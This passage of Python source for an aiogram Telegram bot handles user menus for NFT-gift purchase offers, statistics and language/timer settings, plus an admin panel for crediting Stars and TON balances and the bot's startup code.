# ПОЛЬЗОВАТЕЛЬСКИЕ КНОПКИ
# ============================================================

@dp.callback_query(F.data == "user_offers")
async def user_offers_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id)
    text = "<b>Мои офферы</b>" if rows else "<b>Мои офферы</b>\n\nПока пусто."
    await callback.message.edit_text(text, reply_markup=user_offers_keyboard(rows))
    await callback.answer()


@dp.callback_query(F.data.startswith("user_offer:"))
async def user_offer_detail(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    row = await get_user_offer(order_id)
    if not row or int(row["owner_user_id"]) != callback.from_user.id:
        return await callback.answer("Не найдено", show_alert=True)
    data = json.loads(row["data_json"])
    text = create_deal_card_text(data, f"<b>Статус:</b> {offer_status_label(row['status'])}")
    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="user_offers")]]),
        disable_web_page_preview=True,
    )
    await callback.answer()


@dp.callback_query(F.data == "user_stats")
async def user_stats_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id, 1000)
    counts = {}
    for row in rows:
        counts[row["status"]] = counts.get(row["status"], 0) + 1
    text = (
        f"<b>Статистика</b>\n\nВсего: <b>{len(rows)}</b>\n"
        f"Активных: <b>{counts.get('active', 0)}</b>\n"
        f"Принято: <b>{counts.get('accepted', 0)}</b>\n"
        f"Ждёт покупателя: <b>{counts.get('seller_confirmed', 0)}</b>\n"
        f"Завершено: <b>{counts.get('completed', 0)}</b>\n"
        f"Отклонено: <b>{counts.get('declined', 0)}</b>"
    )
    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="user_panel")]]),
    )
    await callback.answer()


@dp.callback_query(F.data == "user_create_offer")
async def user_create_offer_callback(callback: CallbackQuery):
    await callback.message.edit_text(
        "<b>Создание оффера</b>\n\n"
        "В Business-чате:\n"
        "<code>.buy https://t.me/nft/Name-123 100</code>\n"
        "<code>.buy https://t.me/nft/Name-123 50 ton</code>\n"
        "<code>.buy https://t.me/nft/Name-123 200 ru 12</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="user_panel")]]),
    )
    await callback.answer()


@dp.callback_query(F.data == "user_quick_commands")
async def user_quick_commands_callback(callback: CallbackQuery):
    await callback.message.edit_text(
        "<b>Команды</b>\n\n"
        "<code>.buy https://t.me/nft/Name-123 100</code>\n"
        "<code>.buy https://t.me/nft/Name-123 50 ton</code>\n\n"
        "• stars / ton — валюта\n• ru en ar zh — язык\n• 6 / 12 — таймер",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="user_panel")]]),
    )
    await callback.answer()


@dp.callback_query(F.data == "user_settings")
async def user_settings_callback(callback: CallbackQuery):
    settings = await get_user_settings(callback.from_user.id)
    text = f"<b>Настройки</b>\n\nЯзык: <b>{settings['language'].upper()}</b>\nТаймер: <b>{settings['timer_hours']} ч.</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="RU", callback_data="set_lang:ru"),
            InlineKeyboardButton(text="EN", callback_data="set_lang:en"),
            InlineKeyboardButton(text="AR", callback_data="set_lang:ar"),
            InlineKeyboardButton(text="ZH", callback_data="set_lang:zh"),
        ],
        [
            InlineKeyboardButton(text="6 часов", callback_data="set_timer:6"),
            InlineKeyboardButton(text="12 часов", callback_data="set_timer:12"),
        ],
        [InlineKeyboardButton(text="Назад", callback_data="user_panel")],
    ])
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()


@dp.callback_query(F.data.startswith("set_lang:"))
async def set_lang_callback(callback: CallbackQuery):
    lang = callback.data.split(":")[1]
    if lang not in TEXTS:
        return await callback.answer("Неверный язык", show_alert=True)
    await set_user_setting(callback.from_user.id, "language", lang)
    await callback.answer(f"Язык: {lang.upper()}")
    await user_settings_callback(callback)


@dp.callback_query(F.data.startswith("set_timer:"))
async def set_timer_callback(callback: CallbackQuery):
    hours = int(callback.data.split(":")[1])
    if hours not in (6, 12):
        return await callback.answer("Неверное значение", show_alert=True)
    await set_user_setting(callback.from_user.id, "timer_hours", hours)
    await callback.answer(f"Таймер: {hours} ч.")
    await user_settings_callback(callback)


# ============================================================
# АДМИН
# ============================================================

def admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Выдать Stars", style="success", callback_data="admin_give_stars")],
        [InlineKeyboardButton(text="💎 Выдать TON", style="success", callback_data="admin_give_ton")],
    ])


@dp.message(F.text == "/admin")
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("<b>Админ-панель</b>", reply_markup=admin_keyboard())


@dp.callback_query(F.data.in_({"admin_give_stars", "admin_give_ton"}))
async def admin_give_prompt(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    ADMIN_STATES[callback.from_user.id] = "give_stars" if callback.data == "admin_give_stars" else "give_ton"
    await callback.message.edit_text(
        "<b>Выдача</b>\n\nФормат: <code>ID сумма</code>\nПример: <code>123456789 50</code>\n\n/cancel — отмена"
    )
    await callback.answer()


@dp.message(F.from_user.id == ADMIN_ID)
async def admin_state_input(message: Message):
    if message.from_user.id in USER_STATES:
        return
    state = ADMIN_STATES.get(message.from_user.id)
    if not state or not message.text:
        return
    value = message.text.strip()
    try:
        if state in ("give_stars", "give_ton"):
            parts = value.split()
            if len(parts) != 2:
                raise ValueError
            user_id = int(parts[0])
            amount = float(parts[1].replace(",", "."))
            if amount <= 0:
                raise ValueError
            if state == "give_stars":
                await add_balance(user_id, stars=amount)
                label = "Stars"
            else:
                await add_balance(user_id, ton=amount)
                label = "TON"
            bal = await get_balance(user_id)
            await message.answer(f"✅ +{amount} {label} → <code>{user_id}</code>\n⭐ {bal['stars']} | 💎 {bal['ton']}")
            try:
                await bot.send_message(user_id, f"<b>+{amount} {label}</b> начислено администратором.")
            except Exception:
                pass
        ADMIN_STATES.pop(message.from_user.id, None)
    except (ValueError, InvalidOperation):
        await message.answer("❌ Формат: <code>ID сумма</code>")


# ============================================================
# START
# ============================================================

async def main():
    global BOT_USERNAME
    bot_info = await bot.get_me()
    BOT_USERNAME = bot_info.username
    logger.info("BOT STARTED | @%s", BOT_USERNAME)
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, allowed_updates=["message", "business_message", "callback_query"])


if __name__ == "__main__":
    asyncio.run(main())
